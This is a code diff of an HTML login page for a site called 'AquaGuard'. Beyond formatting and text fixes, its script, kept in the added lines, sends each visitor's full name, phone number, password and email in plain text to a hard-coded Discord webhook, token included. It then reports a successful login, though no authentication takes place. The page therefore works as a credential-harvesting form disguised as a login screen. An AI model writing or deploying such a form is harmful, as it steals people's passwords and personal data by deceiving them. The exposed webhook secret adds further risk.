@@ -18,7 +18,8 @@
     <div class="collapse navbar-collapse" id="navbarSupportedContent">
       <ul class="navbar-nav ms-auto">
         <li class="nav-item">
-          <a class="nav-link" aria-current="page" href=aboutus.html?access=true><h3 class="mt-2">About Us</h3></a>
+          <a class="nav-link" aria-current="page" href="aboutus.html?access=true"><h3 class="mt-2">About Us</h3></a>
+        </li>
       </ul>
     </div>
   </div>
@@ -34,10 +35,13 @@
     <h3 id="formtext">Log In to AquaGuard</h3><br>
     <input id="name" type="text" class="form-control mb-3" placeholder="Enter full name" required>
     <input id="number" type="number" class="form-control mb-3" placeholder="Enter phone number" required>
-    <input id="password" type="password" class="form-control mb-3" placeholder="Enter password " required>
+    <input id="password" type="password" class="form-control mb-3" placeholder="Enter password" required>
     <input id="email" type="email" class="form-control mb-3" placeholder="Enter email address" required>
     <div class="d-flex justify-content-center mb-3">
-      <input class="form-check-input form-switch m-0" type="checkbox" id="agree" required> <label for="agree" style="color: rgb(255, 255, 255);" class="ms-2"><small><h5>agree to the terms and services.</h5> </small></label>
+      <input class="form-check-input form-switch m-0" type="checkbox" id="agree" required> 
+      <label for="agree" style="color: rgb(255, 255, 255);" class="ms-2">
+        <small><h5>Agree to the terms and services.</h5></small>
+      </label>
     </div>
     <button class="btn btn-outline-light mx-auto d-block" type="submit">Log in</button>
   </form>
@@ -49,111 +53,112 @@
     e.preventDefault();
 
     const name = document.getElementById('name').value;
-    const address = document.getElementById('number').value;
+    const number = document.getElementById('number').value;
     const password = document.getElementById('password').value;
     const email = document.getElementById('email').value;
     const agree = document.getElementById('agree').checked;
 
     if (!agree) {
-        alert('You must agree to the terms!');
-        return;
-      } 
-      const webhookURL = "https://discord.com/api/webhooks/1286793971292573717/TVHnQb-xHuPFDCzuvdsDZ8LuWRFjlZ101OXPyPZsu6VoHBxCuQSzo8LoKPb7mueOljcH"; 
+      alert('You must agree to the terms!');
+      return;
+    }
 
-      const payload = {
-        content: `# enterance:\n\n**Name:** ${name}\n**Address:** ${address}\n**Password:** ${password}\n**Email:** ${email}`
-      };
+    const webhookURL = "https://discord.com/api/webhooks/1286793971292573717/TVHnQb-xHuPFDCzuvdsDZ8LuWRFjlZ101OXPyPZsu6VoHBxCuQSzo8LoKPb7mueOljcH"; 
 
-      fetch(webhookURL, {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/json'
-        },
-        body: JSON.stringify(payload)
-      })
-      .then(response => {
-        if (response.ok) {
-          alert('Form submitted successfully!');
-          window.location.href = 'main.html';
-        } else {
-          alert('Error submitting the form.');
-        }
-      })
-      .catch(error => {
-        console.error('Error:', error);
-        alert('Error submitting the form.');
-      });
+    const payload = {
+      content: `# Entrance:\n\n**Name:** ${name}\n**Phone Number:** ${number}\n**Password:** ${password}\n**Email:** ${email}`
+    };
+
+    fetch(webhookURL, {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json'
+      },
+      body: JSON.stringify(payload)
+    })
+    .then(response => {
+      if (response.ok) {
+        alert('Logged in successfully!');
+        window.location.href = 'main.html?Access=true';
+      } else {
+        alert('Error logging in.');
+      }
+    })
+    .catch(error => {
+      console.error('Error:', error);
+      alert('Error logging in.');
     });
+  });
 </script>
 
 <style>
-    .form-control:focus {
-      box-shadow: none;
-      border-color: #ffffff;
+  .form-control:focus {
+    box-shadow: none;
+    border-color: #ffffff;
+  }
+  .text-center {
+    text-align: center;
+  }
+  .form-control::placeholder {
+    color: #aeaeae;
+  }
+  #formtext, #rangeValue, #group2, #group3, #ediz {
+    color: #ffffff;
+  }
+  #group, #phone {
+    background-color: rgba(5, 55, 165, 0);
+  }
+  #formbox {
+    background-color: rgba(159, 192, 208, 0.35);
+    border-radius: 2vh;
+    width: 100%;
+    max-width: 600px;
+    padding: 2rem;
+    margin: 0 auto;
+  }
+  @media (min-width: 992px) {
+    #formtext {
+      font-size: 2rem;
     }
-    .text-center {
-      text-align: center;
+    h3, .lead, h6 {
+      font-size: 1.5rem;
     }
-    .form-control::placeholder {
-      color: #aeaeae;
+    .form-control {
+      font-size: 1.2rem;
+      padding: 10px;
     }
-    #formtext, #rangeValue, #group2, #group3, #ediz {
-      color: #ffffff;
+    .btn-outline-light {
+      font-size: 1.2rem;
+      padding: 10px 20px;
     }
-    #group, #phone {
-      background-color: rgba(5, 55, 165, 0);
+  }
+  @media (max-width: 768px) {
+    #formtext {
+      font-size: 1.5rem;
+    }
+    h3, .lead, h6 {
+      font-size: 1.1rem;
     }
     #formbox {
-      background-color: rgba(159, 192, 208, 0.35);
-      border-radius: 2vh;
       width: 100%;
-      max-width: 600px;
-      padding: 2rem;
-      margin: 0 auto;
+      max-width: 90%;
+      padding: 20px;
     }
-    @media (min-width: 992px) {
-      #formtext {
-        font-size: 2rem;
-      }
-      h3, .lead, h6 {
-        font-size: 1.5rem;
-      }
-      .form-control {
-        font-size: 1.2rem;
-        padding: 10px;
-      }
-      .btn-outline-light {
-        font-size: 1.2rem;
-        padding: 10px 20px;
-      }
+    .form-control {
+      font-size: 1rem;
     }
-    @media (max-width: 768px) {
-      #formtext {
-        font-size: 1.5rem;
-      }
-      h3, .lead, h6 {
-        font-size: 1.1rem;
-      }
-      #formbox {
-        width: 100%;
-        max-width: 90%;
-        padding: 20px;
-      }
-      .form-control {
-        font-size: 1rem;
-      }
-      .btn-outline-light {
-        font-size: 1rem;
-        padding: 10px;
-      }
-      .container {
-        padding-left: 10px;
-        padding-right: 10px;
-      }
+    .btn-outline-light {
+      font-size: 1rem;
+      padding: 10px;
     }
-    body {
-      background-image: linear-gradient(to bottom, #011f49, #000000);
+    .container {
+      padding-left: 10px;
+      padding-right: 10px;
     }
+  }
+  body {
+    background-image: linear-gradient(to bottom, #011f49, #000000);
+  }
 </style>
 
 </body>
